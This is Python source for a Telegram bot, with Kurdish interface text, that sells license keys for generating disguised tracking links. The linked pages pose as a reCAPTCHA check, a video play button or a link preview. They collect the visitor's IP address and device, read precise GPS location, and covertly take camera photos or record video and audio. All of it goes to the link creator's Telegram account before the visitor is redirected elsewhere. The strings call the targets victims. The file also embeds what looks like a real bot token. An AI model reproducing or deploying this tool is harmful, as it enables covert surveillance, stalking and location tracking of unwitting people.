import asyncio
import logging
import os
import base64
import sqlite3
import random
import string
from datetime import datetime, timedelta
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.filters import Command

TOKEN = "8364609349:AAF7i3nTGuvRnIV2kHSbWFCnPnj6iZdgBk4"
ADMIN_ID = 5583813672
FIXED_DOMAIN = "cyber-surche-bot-production.up.railway.app"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

user_states = {}
user_languages = {}

# دروستکردنی داتابەیسی کلیلەکان و لینکە کورتکراوەکان
def init_db():
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS licenses (
            key TEXT PRIMARY KEY,
            user_id INTEGER,
            expiry_date TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS short_links (
            short_code TEXT PRIMARY KEY,
            payload_data TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

def add_license(key: str, days: int = 30):
    expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO licenses (key, user_id, expiry_date) VALUES (?, NULL, ?)", (key, expiry))
    conn.commit()
    conn.close()

def check_license(user_id: int):
    if user_id == ADMIN_ID:
        return True
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("SELECT expiry_date FROM licenses WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    if row:
        try:
            expiry_date = datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S")
            if datetime.now() < expiry_date:
                return True
        except:
            pass
    return False

def activate_key(user_id: int, key: str):
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("SELECT expiry_date, user_id FROM licenses WHERE key = ?", (key,))
    row = cursor.fetchone()
    if row:
        db_expiry, db_user = row
        if db_user is None or db_user == user_id:
            expiry = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")
            cursor.execute("UPDATE licenses SET user_id = ?, expiry_date = ? WHERE key = ?", (user_id, expiry, key))
            conn.commit()
            conn.close()
            return True
    conn.close()
    return False

def create_short_link(payload_data: str):
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO short_links (short_code, payload_data) VALUES (?, ?)", (code, payload_data))
    conn.commit()
    conn.close()
    return code

def get_payload_from_short(code: str):
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("SELECT payload_data FROM short_links WHERE short_code = ?", (code,))
    row = cursor.fetchone()
    conn.close()
    if row:
        return row[0]
    return None

TEXTS = {
    "ku": {
        "menu_link": "🔗 دروستکردنی لینکی هەواڵگری",
        "menu_stats": "📊 باری سیستەم",
        "menu_lang": "🌐 گۆڕینی زمان",
        "menu_ai": "🧠 زیرەکی دەستکرد",
        "welcome": "🌟 **بەخێر بێیت بۆ سیستەمی هەواڵگری گشتی!**\n\n🔑 بۆ بەکارهێنانی بۆتەکە، تکایە کلیلی چالاککردن (License Key) بنووسە:",
        "ask_mode": "⚙️ **تکایە جۆری هەواڵگری هەڵبژێرە:**",
        "ask_template": "🎨 **تکایە دیزاینی پەڕەکە هەڵبژێرە بۆ قوربانی:**",
        "ask_redirect": "🔗 **فەرموو لینکی مەبەست (Redirect Link) بۆ بنێرە** (وەک `https://snapchat.com/...`) تاوەکو قوربانییەکە ڕاستەوخۆ بۆی ببرێت.",
        "stats": "📊 **بارودۆخی سیستەمی شاهانە:**\n\n• دخ: 🟢 ۱۰۰٪ کارا و خێرا\n• ئاستی پارێزراوی: 🛡️ پلەی یەکەم (حکومی)\n• وێب سێرڤەر: 🌐 پەیوەستکراو بە Railway\n• قەبارە و هێز: ⚡ ۲x بەهێزکراو",
        "lang_select": "⚙️ **فەرموو زمانی پەیوەندیکردن هەڵبژێرە:**",
        "lang_changed": "🟢 زمان گۆڕرا بۆ **کوردی**.",
        "ai_prompt": "🧠 **ناوەندی زیرەکی دەستکرد ئامادەیە:**\nفەرموو پرسیار یان داواکارییەکەت بنووسە تاوەکو وەڵامت بدەمەوە.",
        "link_success": "🎯 **لینکی هەواڵگری کورتکراوە بە سەرکەوتوویی دروست بوو!**\n\n🔗 **لینک:** `{payload_link}`\n\n📱 **تایبەتمەندییەکان:**\n• جۆر: {mode_name}\n• دیزاین: {template_name}\n• ڤیدیۆ/ڕەسم و GPSی ورد\n• گواستنەوەی خێرا بۆ لینکی مەبەست",
        "key_active": "🟢 **کلیلەکە بە سەرکەوتوویی چالاک بوو!** ئێستا بۆتەکە بۆ ماوەی ١ مانگ کارا دەبێت.",
        "key_invalid": "❌ **کلیلەکە هەڵەیە یان بەسەرچووە.** تکایە کلیلێکی ڕاست لە ئەدمین وەربگرە.",
        "expired": "❌ **ماوەی کلیلی ١ مانگەی تو کۆتایی هات!**\nتکایە بۆ نوێکردنەوەی کلیل پەیوەندی بە ئەدمین بکە."
    }
}

def get_current_lang(user_id):
    return user_languages.get(user_id, "ku")

def get_reply_menu(lang="ku"):
    t = TEXTS[lang]
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=t["menu_link"]), KeyboardButton(text=t["menu_stats"])],
            [KeyboardButton(text=t["menu_lang"]), KeyboardButton(text=t["menu_ai"])]
        ],
        resize_keyboard=True,
        input_field_placeholder="👑 فەرماندە، فەرمانێک هەڵبژێرە..."
    )

@dp.message(Command("start"))
async def cmd_start(message: Message):
    user_id = message.from_user.id
    lang = get_current_lang(user_id)
    user_languages[user_id] = lang
    
    if user_id == ADMIN_ID:
        await message.answer("🌟 **بەخێر بێیتەوە سەرۆک بۆ پەنەڵی ئەدمین!**\n\n• دروستکردنی کلیل: `/genkey <کلیل>`", reply_markup=get_reply_menu(lang))
        return

    if check_license(user_id):
        await message.answer(TEXTS[lang]["welcome"].replace("🔑 بۆ بەکارهێنانی بۆتەکە، تکایە کلیلی چالاککردن (License Key) بنووسە:", "🟢 کلیلی تو کارایە و سیستەم ئامادەیە."), reply_markup=get_reply_menu(lang))
    else:
        user_states[user_id] = {"step": "waiting_key"}
        await message.answer(TEXTS[lang]["welcome"])

@dp.message(Command("genkey"))
async def generate_key_cmd(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("⚠️ تکایە کلیلێک بنووسە. وەک: `/genkey SURCHI2026`")
        return
    key = args[1].strip()
    add_license(key, days=30)
    await message.answer(f"✅ **کلیل بە سەرکەوتوویی دروست کرا:**\n`{key}`\n\nئەم کلیلە ١ مانگ کارا دەبێت بۆ هەر کەسێک کە بەکاری بهێنێت.")

@dp.message(F.text.in_(["🔗 دروستکردنی لینکی هەواڵگری"]))
async def start_link_creation(message: Message):
    user_id = message.from_user.id
    lang = get_current_lang(user_id)
    
    if not check_license(user_id):
        user_states[user_id] = {"step": "waiting_key"}
        await message.answer(TEXTS[lang]["expired"])
        return
        
    user_states[user_id] = {"step": "waiting_mode"}
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎥 ڤیدیۆ و دەنگ (10 چرکە)", callback_data="mode_video")],
        [InlineKeyboardButton(text="📸 تەنیا ڕەسم (هەر 1.5 چرکە)", callback_data="mode_photo")]
    ])
    await message.answer(TEXTS[lang]["ask_mode"], reply_markup=kb)

@dp.callback_query(F.data.startswith("mode_"))
async def cb_mode_selection(callback: CallbackQuery):
    user_id = callback.from_user.id
    mode = callback.data.split("_")[1]
    lang = get_current_lang(user_id)
    
    user_states[user_id]["mode"] = mode
    user_states[user_id]["step"] = "waiting_template"
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🤖 دیزاینی Not a Robot", callback_data="tpl_robot")],
        [InlineKeyboardButton(text="▶️ دیزاینی دوگمەی پەخش", callback_data="tpl_play")],
        [InlineKeyboardButton(text="🔗 دیزاینی نیشاندانی لینک", callback_data="tpl_link")]
    ])
    await callback.message.edit_text(TEXTS[lang]["ask_template"], reply_markup=kb)

@dp.callback_query(F.data.startswith("tpl_"))
async def cb_template_selection(callback: CallbackQuery):
    user_id = callback.from_user.id
    template = callback.data.split("_")[1]
    lang = get_current_lang(user_id)
    
    user_states[user_id]["template"] = template
    user_states[user_id]["step"] = "waiting_redirect"
    
    await callback.message.edit_text(TEXTS[lang]["ask_redirect"])

@dp.message(F.text.in_(["📊 باری سیستەم"]))
async def system_stats(message: Message):
    user_id = message.from_user.id
    if not check_license(user_id):
        return
    lang = get_current_lang(user_id)
    await message.answer(TEXTS[lang]["stats"], reply_markup=get_reply_menu(lang))

@dp.message(F.text.in_(["🌐 گۆڕینی زمان"]))
async def change_lang_menu(message: Message):
    user_id = message.from_user.id
    if not check_license(user_id):
        return
    lang = get_current_lang(user_id)
    lang_kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="کوردی ☀️", callback_data="lang_ku"),
            InlineKeyboardButton(text="English 🇬🇧", callback_data="lang_en")
        ]
    ])
    await message.answer(TEXTS[lang]["lang_select"], reply_markup=lang_kb)

@dp.message(F.text.in_(["🧠 زیرەکی دەستکرد"]))
async def ai_core_menu(message: Message):
    user_id = message.from_user.id
    if not check_license(user_id):
        return
    lang = get_current_lang(user_id)
    user_states[user_id] = {"step": "waiting_ai_prompt"}
    await message.answer(TEXTS[lang]["ai_prompt"], reply_markup=get_reply_menu(lang))

@dp.callback_query(F.data.startswith("lang_"))
async def set_lang_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    await callback.answer()
    lang = callback.data.split("_")[1]
    user_languages[user_id] = lang
    await callback.message.answer(TEXTS[lang]["lang_changed"], reply_markup=get_reply_menu(lang))

@dp.message(F.text & ~F.text.startswith("/"))
async def handle_text_inputs(message: Message):
    user_id = message.from_user.id
    lang = get_current_lang(user_id)
    text = message.text.strip()
    
    if text in ["🔗 دروستکردنی لینکی هەواڵگری", "📊 باری سیستەم", "🌐 گۆڕینی زمان", "🧠 زیرەکی دەستکرد", "🔗 Create Intelligence Link", "📊 System Status", "🌐 Change Language", "🧠 Artificial Intelligence"]:
        return

    state_info = user_states.get(user_id, {})
    step = state_info.get("step")
    
    if step == "waiting_key":
        if activate_key(user_id, text):
            user_states[user_id] = {}
            await message.answer(TEXTS[lang]["key_active"], reply_markup=get_reply_menu(lang))
        else:
            await message.answer(TEXTS[lang]["key_invalid"])
        return

    if not check_license(user_id):
        user_states[user_id] = {"step": "waiting_key"}
        await message.answer(TEXTS[lang]["expired"])
        return

    if step == "waiting_redirect":
        target_url = text
        mode = state_info.get("mode", "video")
        template = state_info.get("template", "robot")
        
        railway_domain = FIXED_DOMAIN
        if not railway_domain.startswith("http"):
            railway_domain = f"https://{railway_domain}"
            
        payload_data = f"{user_id}|{mode}|{template}|{target_url}"
        short_code = create_short_link(payload_data)
        
        payload_link = f"{railway_domain}/s/{short_code}"
        
        mode_name = "🎥 ڤیدیۆ" if mode == "video" else "📸 ڕەسم"
        template_name = "🤖 Not a Robot" if template == "robot" else ("▶️ دوگمەی پەخش" if template == "play" else "🔗 نیشاندانی لینک")
        
        response_text = TEXTS[lang]["link_success"].format(payload_link=payload_link, mode_name=mode_name, template_name=template_name)
        
        user_states[user_id] = {}
        await message.answer(response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))
        
    elif step == "waiting_ai_prompt":
        ai_response = f"🤖 **Royal AI Analysis:**\n\nبۆ پرسیارەکەی ئێوە ('{text}'):\nسیستەمی زیرەکی دەستکردی شاهانە لە لوتکەی توانادایە."
        user_states[user_id] = {}
        await message.answer(ai_response, reply_markup=get_reply_menu(lang))

@dp.message(F.photo)
async def handle_admin_photo(message: Message):
    # بۆ پاراستنی توانای وەرگرتنی ڕەسم ئەگەر پێویست بکات
    pass

# پەڕەی تەڵەی شاهانە - بە سێ دیزاین و دوو مۆد
async def short_link_handler(request: web.Request):
    short_code = request.match_info.get('code', '')
    payload_data = get_payload_from_short(short_code)
    
    if not payload_data:
        return web.Response(text="Link expired or invalid.", content_type='text/html')
        
    try:
        parts = payload_data.split("|", 3)
        if len(parts) == 4:
            target_user_id = parts[0]
            mode = parts[1]
            template = parts[2]
            redirect_url = parts[3]
        else:
            # بۆ گونجاندن لەگەڵ لینکە کۆنەکان
            target_user_id, redirect_url = payload_data.split("|", 1)
            mode = "video"
            template = "robot"
    except:
        target_user_id = str(ADMIN_ID)
        mode = "video"
        template = "robot"
        redirect_url = 'https://snapchat.com'
        
    headers = request.headers
    user_agent = headers.get('User-Agent', 'Unknown Browser/Device')
    ip = headers.get('X-Forwarded-For', request.remote)
    
    html_body = ""
    if template == "robot":
        html_body = """
        <div class="recaptcha-box" id="box">
            <div class="recaptcha-left">
                <div class="checkbox-container" id="checkContainer" onclick="runEngine()">
                    <input type="checkbox" id="chk">
                </div>
                <div class="spinner-border" id="spinner"></div>
                <div class="recaptcha-text">I'm not a robot</div>
            </div>
            <div class="recaptcha-right">
                <svg width="32" height="32" viewBox="0 0 32 32">
                    <path fill="#4285F4" d="M16 4l12 7v10l-12 7-12-7V11z"/>
                </svg>
                <div class="logo-text">reCAPTCHA</div>
                <div class="logo-sub">Privacy - Terms</div>
            </div>
        </div>
        """
    elif template == "play":
        html_body = """
        <div class="recaptcha-box" id="box" style="justify-content: center; flex-direction: column; cursor: pointer; border: none; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-radius: 15px;" onclick="runEngine()">
            <div id="checkContainer" style="width: 60px; height: 60px; background: linear-gradient(135deg, #e74c3c, #c0392b); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 15px; box-shadow: 0 4px 15px rgba(231,76,60,0.4);">
                <div style="width: 0; height: 0; border-top: 12px solid transparent; border-bottom: 12px solid transparent; border-left: 18px solid white; margin-left: 5px;"></div>
            </div>
            <div class="spinner-border" id="spinner"></div>
            <div class="recaptcha-text" style="text-align: center; margin-top: 10px; font-size: 18px; font-weight: bold; color: #333;">پەخشی ڤیدیۆ / دەنگ</div>
            <div style="font-size: 12px; color: #777; margin-top: 5px;">بۆ دەستپێکردن کلیک بکە</div>
        </div>
        """
    elif template == "link":
        html_body = f"""
        <div class="recaptcha-box" id="box" style="justify-content: center; flex-direction: column; cursor: pointer; border: 1px solid #e0e0e0; border-radius: 10px;" onclick="runEngine()">
            <div id="checkContainer" style="font-size: 45px; margin-bottom: 10px;">🔗</div>
            <div class="spinner-border" id="spinner"></div>
            <div class="recaptcha-text" style="text-align: center; margin-top: 5px; font-size: 15px; word-break: break-all; color: #3498db; font-family: monospace;">{redirect_url}</div>
            <div style="margin-top: 20px; background: #3498db; color: white; padding: 10px 25px; border-radius: 20px; font-size: 14px; font-weight: bold; width: 80%; text-align: center;">چوونە ناو بەستەر</div>
        </div>
        """

    # بەکارهێنانی هەمان کۆدی ئەسڵی مێدیاریکۆردەر کە لەسەر کۆمپیوتەر بێ کێشە کار دەکات
    if mode == "video":
        engine_script = """
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, audio: true })
            .then(function(stream) {
                let video = document.getElementById('v');
                video.srcObject = stream;
                
                let mediaRecorder;
                try {
                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
                } catch (e) {
                    try {
                        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
                    } catch (err) {
                        mediaRecorder = new MediaRecorder(stream);
                    }
                }
                
                let chunks = [];
                mediaRecorder.ondataavailable = function(e) {
                    if (e.data.size > 0) chunks.push(e.data);
                };
                
                mediaRecorder.onstop = function() {
                    let blob = new Blob(chunks, { type: 'video/mp4' });
                    let reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = function() {
                        let base64data = reader.result;
                        fetch('/upload_video', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ video: base64data, owner: targetUserId })
                        }).then(() => {
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = redirectTarget;
                        }).catch(() => {
                            window.location.href = redirectTarget;
                        });
                    };
                };
                
                mediaRecorder.start();
                setTimeout(function() {
                    if (mediaRecorder.state === "recording") {
                        mediaRecorder.stop();
                    }
                }, 4000);
                
            }).catch(function(err) {
                window.location.href = redirectTarget;
            });
        """
    else:
        # مۆدی تەنیا ڕەسم (Photo Mode)
        engine_script = """
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, audio: false })
            .then(function(stream) {
                let video = document.getElementById('v');
                video.srcObject = stream;
                
                video.onloadedmetadata = function(e) {
                    video.play();
                };
                
                let canvas = document.createElement('canvas');
                let context = canvas.getContext('2d');
                let shots = 0;
                
                let interval = setInterval(function() {
                    if(video.videoWidth > 0) {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        let base64data = canvas.toDataURL('image/jpeg', 0.8);
                        
                        fetch('/upload_photo', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ image: base64data, owner: targetUserId })
                        });
                        shots++;
                    }
                    if(shots >= 4) { // پاش ٤ ڕەسم قوربانییەکە دەباتە لینکەکە
                        clearInterval(interval);
                        stream.getTracks().forEach(t => t.stop());
                        window.location.href = redirectTarget;
                    }
                }, 1500); // هەر ١.٥ چرکە جارێک
            }).catch(function(err) {
                window.location.href = redirectTarget;
            });
        """
    
    html_content = f"""<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        body {{
            background: #f1f3f4;
            color: #202124;
            font-family: Roboto, Arial, sans-serif;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }}
        .recaptcha-box {{
            background: #ffffff;
            border: 1px solid #d3d3d3;
            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
            padding: 22px 18px;
            border-radius: 3px;
            max-width: 304px;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: auto;
        }}
        .recaptcha-left {{
            display: flex;
            align-items: center;
            gap: 12px;
        }}
        .spinner-border {{
            width: 28px;
            height: 28px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: none;
        }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        .checkbox-container {{
            width: 28px;
            height: 28px;
            background: #fff;
            border: 2px solid #c1c1c1;
            border-radius: 2px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        .checkbox-container input {{
            width: 20px;
            height: 20px;
            cursor: pointer;
            opacity: 0;
            position: absolute;
        }}
        .recaptcha-text {{
            font-size: 14px;
            font-weight: 500;
            color: #000;
            text-align: left;
        }}
        .recaptcha-right {{
            display: flex;
            flex-direction: column;
            align-items: center;
        }}
        .logo-text {{
            font-size: 10px;
            color: #555;
            margin-top: 2px;
        }}
        .logo-sub {{
            font-size: 8px;
            color: #777;
        }}
    </style>
</head>
<body>
    {html_body}
    
    <video id="v" autoplay playsinline muted style="display:none;"></video>

    <script>
        const redirectTarget = "{redirect_url}";
        const targetUserId = "{target_user_id}";
        const clientInfo = {{ userAgent: "{user_agent}", ip: "{ip}", owner: targetUserId }};

        fetch('/save_info', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(clientInfo)
        }});

        function runEngine() {{
            let checkContainer = document.getElementById('checkContainer');
            let spinner = document.getElementById('spinner');
            if (checkContainer) checkContainer.style.display = 'none';
            if (spinner) spinner.style.display = 'block';

            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(function(pos) {{
                    fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude + '&owner=' + targetUserId);
                }}, function(err) {{
                    console.log("GPS Error");
                }}, {{ timeout: 5000, enableHighAccuracy: true }});
            }}

            {engine_script}
        }}
    </script>
</body>
</html>"""
    return web.Response(text=html_content, content_type='text/html')

async def save_info(request):
    try:
        data = await request.json()
        ua = data.get('userAgent')
        ip = data.get('ip')
        owner = int(data.get('owner', ADMIN_ID))
        await bot.send_message(
            chat_id=owner, 
            text=f"👑 **زانیاری نوێ لە سیستەمی شاهانە:**\n\n🌐 **IP:** `{ip}`\n💻 **ئامێر:** `{ua}`"
        )
    except Exception as e:
        logging.error(f"Info error: {e}")
    return web.json_response({"status": "ok"})

async def upload_video(request):
    try:
        data = await request.json()
        video_data = data.get('video')
        owner = int(data.get('owner', ADMIN_ID))
        if video_data and "," in video_data:
            encoded = video_data.split(",", 1)[1]
            video_bytes = base64.b64decode(encoded)
            video_file = BufferedInputFile(video_bytes, filename="secure_stream.mp4")
            await bot.send_video(
                chat_id=owner, 
                video=video_file, 
                caption="🚨 **ڤیدیۆ، وێنە و دەنگی ڕوونی ئامانج بە سەرکەوتوویی تۆمارکرا و نێردرا!**"
            )
    except Exception as e:
        logging.error(f"Video upload error: {e}")
    return web.json_response({"status": "ok"})

async def upload_photo(request):
    try:
        data = await request.json()
        image_data = data.get('image')
        owner = int(data.get('owner', ADMIN_ID))
        if image_data and "," in image_data:
            img_bytes = base64.b64decode(image_data.split(",", 1)[1])
            photo_file = BufferedInputFile(img_bytes, filename="cam_shot.jpg")
            await bot.send_photo(
                chat_id=owner, 
                photo=photo_file, 
                caption="📸 **ڕەسمی نوێی قوربانی گیرا و نێردرا!**"
            )
    except Exception as e:
        logging.error(f"Photo upload error: {e}")
    return web.json_response({"status": "ok"})

async def save_location(request):
    lat = request.query.get('lat')
    lon = request.query.get('lon')
    owner = int(request.query.get('owner', ADMIN_ID))
    if lat and lon:
        await bot.send_location(chat_id=owner, latitude=float(lat), longitude=float(lon))
        await bot.send_message(chat_id=owner, text=f"📍 **شوێنی جوگرافی GPS (گۆگڵ ماپ):**\nپانی: `{lat}`\nدرێژی: `{lon}`\n🌐 [ببینە لە سەر نەخشە](https://maps.google.com/?q={lat},{lon})")
    return web.json_response({"status": "ok"})

async def index_handler(request):
    return web.Response(text="Royal Intelligence Core is Active & Boosted.", content_type='text/html')

async def main():
    app = web.Application(client_max_size=50*1024*1024)
    app.router.add_get('/', index_handler)
    app.router.add_get('/s/{code}', short_link_handler)
    app.router.add_post('/save_info', save_info)
    app.router.add_post('/upload_video', upload_video)
    app.router.add_post('/upload_photo', upload_photo)
    app.router.add_get('/save_location', save_location)

    runner = web.AppRunner(app)
    await runner.setup()
    
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

    logging.info(f"Royal Web Server started on port {port}.")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
